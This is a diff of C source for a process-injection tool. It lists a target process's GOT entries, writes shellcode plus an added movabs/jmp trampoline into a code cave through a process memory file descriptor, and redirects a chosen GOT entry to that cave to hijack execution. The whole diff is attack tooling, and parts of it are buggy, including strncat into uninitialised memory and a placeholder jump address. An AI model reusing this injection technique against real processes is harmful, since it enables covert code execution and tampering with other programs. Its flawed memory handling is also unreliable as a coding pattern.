@@ -23,26 +23,25 @@ typedef struct got_table {
   int count;
 } got_table;
 
-void read_got_table(got_table* table) {
+int* read_got_table(got_table* table, int* overwrite) {
   printf("GOT has %d entries:\n", table->count);
   for (int i = 0; i < table->count; i++) {
     printf("Entry %d: %p -> %p\n", (i + 1), (void*)*table->entries[i]->addr, (void*)*table->entries[i]->val);
   }
 
-  return;
-}
-
-void overwrite_got_entry(got_table* table, unsigned long* code_cave, int* fd_mem) {
-  int* overwrite = malloc(sizeof(int));
-
-  read_got_table(table);
   printf("\nApologies for the lack of symbol information...\n");
   printf("We are working on that...\n");
   printf("\nWhich entry would you like to overwrite?\n");
   printf("Entry: ");
   scanf("%d", overwrite);
 
-  printf("Attempting to overwrite entry %d\n", *overwrite);
+  *overwrite = *overwrite - 1; // Make this index-able
+                              
+  return overwrite;
+}
+
+void overwrite_got_entry(got_table* table, unsigned long* code_cave, int* fd_mem, int* overwrite) {
+  printf("Attempting to overwrite entry %d\n", (*overwrite + 1));
   lseek(*fd_mem, *table->entries[*overwrite]->addr, SEEK_SET);
 
   int write_result = write(*fd_mem, code_cave, 0x8);
@@ -207,9 +206,30 @@ char* get_base_addr(int* pid) {
   return addr;
 }
 
-void write_to_cave(unsigned long* code_cave, char* shell_code, int* size, int* fd_mem) {
+void write_to_cave(unsigned long* code_cave, char* shell_code, int* size, int* fd_mem, got_table* table, int* overwrite) {
+  // How to jmp to addr
+  //48 b8 dd dd ee ee ff 	movabs $0xffffeeeedddd,%rax
+  //ff 00 00
+  //ff e0                	jmpq   *%rax
+  // "X" == NULL
+
+  char* the_magic = "\x48\xb8\xdd\xdd\xee\xee\xff\xffXX\xff\xe0";
+  int magic_len = *size + strlen(the_magic);
+  
+  char* magic_code = malloc(magic_len);
+
+  strncat(magic_code, shell_code, *size);
+  strncat(magic_code, the_magic, (magic_len - *size));
+
+  for (int i = 0; i < strlen(magic_code); i++) {
+    if (magic_code[i] == 'X') {
+      magic_code[i] = '\x00';
+    }
+  }
+
   lseek(*fd_mem, *code_cave, SEEK_SET);
-  write(*fd_mem, shell_code, *size);
+  //write(*fd_mem, shell_code, *size);
+  write(*fd_mem, magic_code, magic_len);
 
   free(size);
 
